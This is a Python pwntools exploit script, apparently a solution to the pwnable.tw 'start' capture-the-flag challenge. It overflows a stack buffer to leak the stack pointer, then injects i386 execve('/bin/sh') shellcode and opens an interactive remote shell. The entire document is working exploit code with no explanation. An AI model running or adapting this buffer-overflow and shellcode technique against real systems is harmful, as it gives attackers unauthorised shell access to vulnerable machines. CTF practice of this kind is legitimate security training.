from pwn import *

context.arch = "i386"

TARGET_HOST = "chall.pwnable.tw"
TARGET_PORT = 10000

def find_out_esp(conn):
    # mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80;
    print_esp = p32(0x08048087) 
    payload = b'_'*20 + print_esp
    conn.recvuntil('CTF:')
    conn.send(payload)
    result = u32(conn.recv()[:4])
    print("$esp = ", hex(result))
    return result


def send_shellcode(conn):
    shellcode = asm('\n'.join([
        'push %d' % u32('/sh\0'),
        'push %d' % u32('/bin'),
        'xor edx, edx',
        'xor ecx, ecx',
        'mov ebx, esp',
        'mov eax, 0xb',
        'int 0x80',
    ]))
    esp = find_out_esp(conn)
    payload = b'_'*20 + p32(esp+20) + shellcode
    conn.send(payload)
    conn.interactive()


conn = remote(TARGET_HOST, TARGET_PORT)
send_shellcode(conn)
